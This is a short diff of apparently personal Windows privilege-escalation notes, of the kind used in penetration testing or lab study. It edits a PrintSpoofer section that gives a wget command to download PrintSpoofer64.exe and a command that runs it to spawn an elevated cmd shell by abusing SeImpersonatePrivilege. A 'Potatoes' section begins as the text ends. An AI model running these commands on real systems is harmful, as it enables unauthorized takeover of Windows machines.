@@ -15,11 +15,11 @@ This also applies to other Windows services.
 # SeImpersonatePrivilege
 ## PrintSpoofer
 Objectively the best way to privesc this imo.
-```
+```batch
 wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
 ```
-```
-PrintSpoofer64.exe -i -c cmd
+```batch
+.\PrintSpoofer64.exe -i -c cmd
 ```
 ## Potatoes
 ```bash
